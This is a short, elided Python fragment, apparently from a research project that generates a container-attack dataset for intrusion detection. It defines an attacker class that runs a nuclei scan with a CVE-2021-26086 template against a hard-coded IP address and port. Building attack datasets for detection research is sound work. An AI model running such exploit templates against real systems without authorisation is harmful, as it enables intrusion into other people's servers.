...
class PT_CVE_2021_26086_Attacker1(AttackerBase):
    ...
    def main(self):
        ...
        self.commandRunner.runCommand('nuclei -u http://144.122.71.18:30010 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2021-26086.yaml')
